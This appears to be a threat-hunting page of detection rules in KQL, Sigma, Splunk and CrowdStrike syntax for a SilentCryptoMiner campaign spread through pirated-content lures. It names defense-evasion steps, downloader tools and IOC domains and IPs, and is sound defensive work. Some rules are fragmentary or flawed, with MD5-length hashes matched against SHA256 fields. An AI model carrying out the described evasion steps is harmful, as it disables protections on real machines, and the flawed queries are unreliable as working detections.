Actions on Objectives
Likely
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Office app spawning script/LOLBin child process · Article-specific behavioural hunt — Pirates in the crosshairs: how one cybercrime gang has been infecting book, movi
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] HLS Installer.874.exe DLL side-load from pirate-streaming ZIP lure · [LLM] SilentCryptoMiner-fork: Defender exclusions added for %USERPROFILE%, %PROGRAMDATA%, %WINDIR%, .exe, .dll · [LLM] MSRT tampering: HKLM\Software\Policies\Microsoft\MRT DontOfferThroughWUAU = 1 · [LLM] powercfg sleep/hibernate disable burst (4-command sequence) · File hash IOCs — endpoint file/process match
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] SilentCryptoMiner DNS tunneling to *.microsoft.com lookalike and known C2 .space domains · Beaconing — periodic outbound to small set of destinations · Network connections to article IPs / domains · DNS tunneling / TXT-heavy domain queries
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] HLS Installer.874.exe DLL side-load from pirate-streaming ZIP lure Installation High
Hunts the SilentCryptoMiner-fork delivery chain: the bundled legitimate 'HLS Installer.874.exe' executes from a user-downloaded archive and loads a same-directory rogue DLL, which then reflectively maps the encrypted main module. Targets the exact binary name and the user-writable parent folders (Downloads / Temp / Desktop) the lure ZIP unpacks into. Rationale: Anchors on the article's verbatim binary name 'HLS Installer.874.exe' (code block 1) and the user-writable archive-unpack locations where pirated lures land. Defender query joins process-create to image-load on the same PID to confirm side-loading rather than just an executed installer. Cross-checked NTT Security's 'chromium-patch-nightly' lure variant referenced in the article body. Cross-checked against: • https://attack.mitre.org/techniques/T1574/002/ • https://github.com/SilentMine/SilentCryptoMiner
ATT&CKT1574.002 T1204.002
Data sourcesEndpoint.Processes Endpoint.Filesystem
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "HLS Installer.874.exe"
| where FolderPath has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\")
| join kind=inner (
    DeviceImageLoadEvents
    | where Timestamp > ago(14d)
    | where InitiatingProcessFileName =~ "HLS Installer.874.exe"
    | where FolderPath has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\")
    | where FileName endswith ".dll"
) on DeviceId, $left.ProcessId == $right.InitiatingProcessId
| project Timestamp, DeviceName, AccountName, ProcessFolder=FolderPath, ProcessCmd=ProcessCommandLine, SideLoadedDll=FileName1, DllFolder=FolderPath1, DllSha256=SHA2561
| order by Timestamp desc
let Lookback = 14d;
let ProcEvts = ImProcessCreate
| where TimeGenerated > ago(Lookback)
| where ActingProcessName endswith "HLS Installer.874.exe"
| where ActingProcessName has_any (@"\Downloads\", @"\Desktop\", @"\Temp\", @"\AppData\Local\Temp\");
let DllEvts = ImFileEvent
| where TimeGenerated > ago(Lookback)
| where ActingProcessName endswith "HLS Installer.874.exe"
| where TargetFileName endswith ".dll";
ProcEvts
| join kind=inner (DllEvts) on DvcHostname
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileSHA256
| order by TimeGenerated desc
title: HLS Installer.874.exe Execution From User-Writable Path
id: c93f5b62-3a17-4f4a-9f1d-8c0f47b8ab21
description: Detects execution of the legitimately-signed 'HLS Installer.874.exe' binary used as a DLL side-loading host by the SilentCryptoMiner-fork distributed via pirated streaming and digital-library sites.
references:
  - https://securelist.com/video-books-pirates-miners-rat/119943/
author: SOC Detection Engineering
date: 2026/05/28
tags:
  - attack.t1574.002
  - attack.t1204.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\HLS Installer.874.exe'
  paths:
    Image|contains:
      - '\Downloads\'
      - '\Desktop\'
      - '\Temp\'
      - '\AppData\Local\Temp\'
  condition: selection and paths
level: high
source:(windows.sysmon OR windows.security) @EventID:(1 OR 4688) @Image:(*\HLS\ Installer.874.exe OR *\hls\ installer.874.exe OR *\HLS\ INSTALLER.874.EXE) (@Image:*\Downloads\* OR @Image:*\Desktop\* OR @Image:*\Temp\* OR @Image:*\AppData\Local\Temp\*)
#event_simpleName=ProcessRollup2
| ImageFileName=/\\HLS Installer\.874\.exe$/i
| regex("\\\\(Downloads|Desktop|Temp|AppData\\\\Local\\\\Temp)\\\\", field=ImageFileName)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, SHA256HashData], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="HLS Installer.874.exe" (Processes.process_path="*\\Downloads\\*" OR Processes.process_path="*\\Desktop\\*" OR Processes.process_path="*\\Temp\\*" OR Processes.process_path="*\\AppData\\Local\\Temp\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="HLS Installer.874.exe" (Processes.process_path="*\\Downloads\\*" OR Processes.process_path="*\\Desktop\\*" OR Processes.process_path="*\\Temp\\*" OR Processes.process_path="*\\AppData\\Local\\Temp\\*") by Processes.dest Processes.user Processes.process_path Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] SilentCryptoMiner-fork: Defender exclusions added for %USERPROFILE%, %PROGRAMDATA%, %WINDIR%, .exe, .dll Installation High
Detects the privileged preparatory step in the SilentCryptoMiner-fork chain: bulk addition of Defender path AND extension exclusions covering EXE, DLL, and the three root profile directories. The combination is unusual outside MDM / GPO baselines and is the campaign's defense-evasion fingerprint. Rationale: Anchors on the article's exact exclusion targets (.exe, .dll, %USERPROFILE%, %PROGRAMDATA%, %WINDIR%). Requiring >=3 of the five exclusion strings within a 10-min window distinguishes the campaign's bulk-add behaviour from a single legitimate IT exclusion. Cross-checked MITRE T1562.001 and prior SilentCryptoMiner write-ups (Kaspersky 'Undercover miner' post referenced inline in the article). Cross-checked against: • https://attack.mitre.org/techniques/T1562/001/ • https://securelist.com/silentcryptominer-as-restriction-bypass-tool/115960/
ATT&CKT1562.001
Data sourcesEndpoint.Registry Endpoint.Processes
let WindowMins = 10m;
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has @"\Microsoft\Windows Defender\Exclusions"
| where RegistryValueName in~ (".exe", ".dll") or RegistryValueName has_any ("%USERPROFILE%", "%PROGRAMDATA%", "%WINDIR%")
| summarize ExclusionCount = dcount(RegistryValueName), Exclusions = make_set(RegistryValueName), Bucket = bin(Timestamp, WindowMins), Actor = any(InitiatingProcessFileName), ActorCmd = any(InitiatingProcessCommandLine) by DeviceId, DeviceName
| where ExclusionCount >= 3
| order by Bucket desc
let WindowMins = 10m;
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where RegistryKey has @"\Microsoft\Windows Defender\Exclusions"
| where RegistryValue in~ (".exe", ".dll") or RegistryValue has_any ("%USERPROFILE%", "%PROGRAMDATA%", "%WINDIR%")
| summarize ExclusionCount = dcount(RegistryValue), Exclusions = make_set(RegistryValue), Bucket = bin(TimeGenerated, WindowMins), Actor = any(ActingProcessName), ActorCmd = any(ActingProcessCommandLine) by DvcHostname
| where ExclusionCount >= 3
| order by Bucket desc
source:(windows.sysmon OR windows.defender) @EventID:13 (@TargetObject:*\Microsoft\Windows\ Defender\Exclusions\Paths\* OR @TargetObject:*\Microsoft\Windows\ Defender\Exclusions\Extensions\*) (@TargetObject:*%USERPROFILE%* OR @TargetObject:*%PROGRAMDATA%* OR @TargetObject:*%WINDIR%* OR @TargetObject:*\.exe OR @TargetObject:*\.dll)
#event_simpleName=AsepValueUpdate
| regex("\\\\Microsoft\\\\Windows Defender\\\\Exclusions\\\\(Paths|Extensions)", field=RegObjectName)
| (RegValueName=/%USERPROFILE%/i OR RegValueName=/%PROGRAMDATA%/i OR RegValueName=/%WINDIR%/i OR RegValueName=/^\.exe$/i OR RegValueName=/^\.dll$/i)
| groupBy([aid, ComputerName, ContextImageFileName], function=count(field=RegValueName, distinct=true, as=ExclusionCount))
| ExclusionCount >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.

[LLM] MSRT tampering: HKLM\Software\Policies\Microsoft\MRT DontOfferThroughWUAU = 1 Installation High
Detects the SilentCryptoMiner-fork's MSRT-suppression step: writing the DontOfferThroughWUAU=1 policy value under HKLM\Software\Policies\Microsoft\MRT to block reinstallation, often paired with deletion of %WINDIR%\System32\mrt.exe via ZwSetInformationFile FileDispositionInformation. Rationale: Anchors on the article's exact policy path 'HKLM\Software\Policies\Microsoft\MRT', value name 'DontOfferThroughWUAU', and the data value 1 used to block MSRT reinstall via Windows Update. Pairs the registry write with the article-described mrt.exe deletion under System32 (via ZwSetInformationFile/FileDispositionInformation) for higher fidelity. Cross-checked MITRE T1562.001 mapping. Cross-checked against: • https://attack.mitre.org/techniques/T1562/001/ • https://learn.microsoft.com/en-us/windows/win32/api/ntifs/nf-ntifs-zwsetinformationfile
ATT&CKT1562.001 T1112
Data sourcesEndpoint.Registry Endpoint.Filesystem
let Lookback = 14d;
let RegHit = DeviceRegistryEvents
| where Timestamp > ago(Lookback)
| where ActionType in ("RegistryValueSet", "RegistryKeyCreated")
| where RegistryKey has @"\Software\Policies\Microsoft\MRT"
| where RegistryValueName =~ "DontOfferThroughWUAU"
| where tostring(RegistryValueData) in ("1", "0x1", "0x00000001")
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, Actor=InitiatingProcessFileName, ActorCmd=InitiatingProcessCommandLine, Signal="MRT_PolicyReg";
let FileHit = DeviceFileEvents
| where Timestamp > ago(Lookback)
| where ActionType in ("FileDeleted", "FileRenamed")
| where FolderPath has @"\System32\" and FileName =~ "mrt.exe"
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, Actor=InitiatingProcessFileName, ActorCmd=InitiatingProcessCommandLine, Signal="MRT_FileDelete";
union RegHit, FileHit
| order by Timestamp desc
let Lookback = 14d;
let RegHit = ImRegistryEvent
| where TimeGenerated > ago(Lookback)
| where RegistryKey has @"\Software\Policies\Microsoft\MRT"
| where RegistryValue =~ "DontOfferThroughWUAU"
| where tostring(RegistryValueData) in ("1", "0x1", "0x00000001")
| project TimeGenerated, DvcHostname, ActorUsername, Actor=ActingProcessName, ActorCmd=ActingProcessCommandLine, Signal="MRT_PolicyReg";
let FileHit = ImFileEvent
| where TimeGenerated > ago(Lookback)
| where EventType in ("FileDeleted", "FileRenamed")
| where TargetFilePath has @"\System32\"
| where TargetFileName =~ "mrt.exe"
| project TimeGenerated, DvcHostname, ActorUsername, Actor=ActingProcessName, ActorCmd=ActingProcessCommandLine, Signal="MRT_FileDelete";
union RegHit, FileHit
| order by TimeGenerated desc

[LLM] powercfg sleep/hibernate disable burst (4-command sequence) Installation High
Detects the SilentCryptoMiner-fork's miner-uptime preparation: four powercfg commands disabling hibernate AC, hibernate DC, standby AC, and standby DC in rapid succession. The four-command burst from a single non-administrative parent is the campaign signature distinguishing miners from legitimate power-management tweaks. Rationale: Anchors on the four verbatim powercfg arguments from the article (table 2: hibernate-timeout-ac/dc, standby-timeout-ac/dc, all set to 0). Requiring >=3 distinct variants in a 5-min window separates the miner's burst from a sysadmin tweaking a single setting. The /x form in the article is also alternative-matched. Cross-checked against: • https://attack.mitre.org/techniques/T1496/ • https://learn.microsoft.com/en-us/windows-hardware/design/device-experiences/powercfg-command-line-options
ATT&CKT1562.001 T1496
Data sourcesEndpoint.Processes
let WindowMins = 5m;
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "powercfg.exe"
| where ProcessCommandLine has_any ("-hibernate-timeout-ac 0", "-hibernate-timeout-dc 0", "-standby-timeout-ac 0", "-standby-timeout-dc 0", "/x -hibernate-timeout", "/x -standby-timeout")
| extend Flag = case(
    ProcessCommandLine has "hibernate-timeout-ac", "hib_ac",
    ProcessCommandLine has "hibernate-timeout-dc", "hib_dc",
    ProcessCommandLine has "standby-timeout-ac", "sby_ac",
    ProcessCommandLine has "standby-timeout-dc", "sby_dc",
    "other")
| summarize Variants = dcount(Flag), Cmds = make_set(ProcessCommandLine), Parent = any(InitiatingProcessFileName), ParentCmd = any(InitiatingProcessCommandLine), Bucket = bin(Timestamp, WindowMins) by DeviceId, DeviceName, AccountName
| where Variants >= 3
| order by Bucket desc
let WindowMins = 5m;
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessName endswith "powercfg.exe"
| where ActingProcessCommandLine has_any ("-hibernate-timeout-ac 0", "-hibernate-timeout-dc 0", "-standby-timeout-ac 0", "-standby-timeout-dc 0", "/x -hibernate-timeout", "/x -standby-timeout")
| extend Flag = case(
    ActingProcessCommandLine has "hibernate-timeout-ac", "hib_ac",
    ActingProcessCommandLine has "hibernate-timeout-dc", "hib_dc",
    ActingProcessCommandLine has "standby-timeout-ac", "sby_ac",
    ActingProcessCommandLine has "standby-timeout-dc", "sby_dc",
    "other")
| summarize Variants = dcount(Flag), Cmds = make_set(ActingProcessCommandLine), Parent = any(ParentProcessName), ParentCmd = any(ParentProcessCommandLine), Bucket = bin(TimeGenerated, WindowMins) by DvcHostname, ActorUsername
| where Variants >= 3
| order by Bucket desc
source:(windows.sysmon OR windows.security) @EventID:(1 OR 4688) (@Image:*\powercfg.exe OR @Image:*\POWERCFG.EXE) (@CommandLine:*-hibernate-timeout-ac\ 0* OR @CommandLine:*-hibernate-timeout-dc\ 0* OR @CommandLine:*-standby-timeout-ac\ 0* OR @CommandLine:*-standby-timeout-dc\ 0*)
#event_simpleName=ProcessRollup2
| ImageFileName=/\\powercfg\.exe$/i
| regex("-(hibernate|standby)-timeout-(ac|dc)\\s+0", field=CommandLine)
| groupBy([aid, ComputerName, ParentBaseFileName], function=count(field=CommandLine, distinct=true, as=Variants))
| Variants >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count values(Processes.process) as commands min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="powercfg.exe" (Processes.process="*-hibernate-timeout-ac*0*" OR Processes.process="*-hibernate-timeout-dc*0*" OR Processes.process="*-standby-timeout-ac*0*" OR Processes.process="*-standby-timeout-dc*0*") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | where count >= 3
| tstats summariesonly=false count values(Processes.process) as commands min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name="powercfg.exe" (Processes.process="*-hibernate-timeout-ac*0*" OR Processes.process="*-hibernate-timeout-dc*0*" OR Processes.process="*-standby-timeout-ac*0*" OR Processes.process="*-standby-timeout-dc*0*") by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process | `drop_dm_object_name(Processes)` | where count >= 3
[LLM] SilentCryptoMiner DNS tunneling to *.microsoft.com lookalike and known C2 .space domains Command & Control High
Hunts the article's specific C2 channel: DNS queries to lookalike domains ending in 'microsoft.com' but resolving to non-Microsoft IPs, plus direct queries to the article's six .space/.online IOC domains. The DNS-tunneled fingerprint payload (CPU info, C: serial, elevation flag, start time) is encoded into a single large subdomain label. Rationale: Anchors on the article's eight IOC domains, the IP 107.172.212.235, and the described DNS-tunneling pattern of long subdomain labels under *.microsoft.com whose A-record resolution falls outside Microsoft's published ranges. The query unions the high-confidence IOC branch with the heuristic tunneling branch so legacy unsubmitted-IP detections and known-IOC detections share one rule. Cross-checked MITRE T1071.004 / T1572 mappings. Cross-checked against: • https://attack.mitre.org/techniques/T1071/004/ • https://attack.mitre.org/techniques/T1572/ • https://learn.microsoft.com/en-us/microsoft-365/enterprise/urls-and-ip-address-ranges
ATT&CKT1071.004 T1572
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
let CampaignDomains = dynamic(["urush1bar4.online","file.ipfs.us.69.mu","5d14vnfb.space","r7mvjl67.space","zgj1tam9.space","jeaw520i.space","qdmagva5.space","m4yuri.online"]);
let CampaignIp = "107.172.212.235";
let IocHit = DeviceNetworkEvents
| where Timestamp > ago(14d)
| where (isnotempty(RemoteUrl) and RemoteUrl has_any (CampaignDomains)) or RemoteIP == CampaignIp
| project Timestamp, DeviceId, DeviceName, AccountName=InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, Signal="IOC_Hit";
let TunnelHit = DeviceEvents
| where Timestamp > ago(14d)
| where ActionType == "DnsQueryResponse" or ActionType has "Dns"
| where RemoteUrl endswith ".microsoft.com"
| extend QueryLen = strlen(RemoteUrl)
| where QueryLen > 80
| where not(RemoteIP startswith "13." or RemoteIP startswith "20." or RemoteIP startswith "23." or RemoteIP startswith "40." or RemoteIP startswith "52." or RemoteIP startswith "104." or RemoteIP startswith "131.107." or RemoteIP startswith "134.170." or RemoteIP startswith "137.116." or RemoteIP startswith "157.55." or RemoteIP startswith "168.61." or RemoteIP startswith "191.236." or RemoteIP startswith "207.46.")
| project Timestamp, DeviceId, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteIP, RemoteUrl, Signal="DNS_Tunnel_MSLookalike";
union IocHit, TunnelHit
| order by Timestamp desc
let CampaignDomains = dynamic(["urush1bar4.online","file.ipfs.us.69.mu","5d14vnfb.space","r7mvjl67.space","zgj1tam9.space","jeaw520i.space","qdmagva5.space","m4yuri.online"]);
let CampaignIp = "107.172.212.235";
let MsRanges = dynamic(["13.","20.","23.","40.","52.","104.","131.107.","134.170.","137.116.","157.55.","168.61.","191.236.","207.46."]);
let IocHit = ImDnsActivity
| where TimeGenerated > ago(14d)
| where DnsQuery has_any (CampaignDomains)
| project TimeGenerated, DvcHostname, SrcUsername, DnsQuery, DstIpAddr, Signal="IOC_Hit";
let TunnelHit = ImDnsActivity
| where TimeGenerated > ago(14d)
| where DnsQuery endswith ".microsoft.com"
| extend QueryLen = strlen(DnsQuery)
| where QueryLen > 80
| extend InMsRange = iff(isnotempty(DstIpAddr) and (DstIpAddr startswith "13." or DstIpAddr startswith "20." or DstIpAddr startswith "23." or DstIpAddr startswith "40." or DstIpAddr startswith "52." or DstIpAddr startswith "104." or DstIpAddr startswith "131.107." or DstIpAddr startswith "134.170." or DstIpAddr startswith "137.116." or DstIpAddr startswith "157.55." or DstIpAddr startswith "168.61." or DstIpAddr startswith "191.236." or DstIpAddr startswith "207.46."), true, false)
| where InMsRange == false
| project TimeGenerated, DvcHostname, SrcUsername, DnsQuery, DstIpAddr, Signal="DNS_Tunnel_MSLookalike";
union IocHit, TunnelHit
| order by TimeGenerated desc

Beaconing — periodic outbound to small set of destinations Command & Control Medium
C2 channel detection via inter-beacon-time stddev / fan-out to single dest.
ATT&CKT1071.001 T1071.004
Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port
| extend delta_sec = datetime_diff('second', Timestamp, prev_ts)
| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)
    by DeviceName, RemoteIP, RemotePort
| where conn_count > 30 and avg_delta between (30.0 .. 600.0) and stdev_delta < 5.0
| order by conn_count desc
ImNetworkSession
| where TimeGenerated > ago(2h)
| where DvcAction != "Block"
| where ipv4_is_private(DstIpAddr) == false
| summarize ConnCount = count(),
            DistinctMinutes = dcount(bin(TimeGenerated, 1m))
            by DvcHostname, DstIpAddr, DstPortNumber
| where ConnCount > 50 and DistinctMinutes > 30   // sustained, not bursty
| order by ConnCount desc
NETWORK
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic

    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count
| tstats summariesonly=false count, values(All_Traffic.dest_port) AS ports
    from datamodel=Network_Traffic.All_Traffic
    where All_Traffic.action="allowed" AND All_Traffic.dest_category!="internal"
    by _time span=10s, All_Traffic.src, All_Traffic.dest
| `drop_dm_object_name(All_Traffic)`
| streamstats current=f last(_time) AS prev_time by src, dest
| eval delta = _time - prev_time
| stats avg(delta) AS avg_delta stdev(delta) AS sd_delta count by src, dest
| where count > 30 AND sd_delta < 5 AND avg_delta>=30 AND avg_delta<=600
| sort - count

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB

``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user

     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host

Toggle if your env has no CIM data-model acceleration.

      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")

    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or SHA1 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df") or MD5 in~ ("6a0fe6065d76715feebc1526d456db73", "7f624407ae489324e96a708a09c17e6f", "02a43b3423367b9dddc24cc7dfc070df")
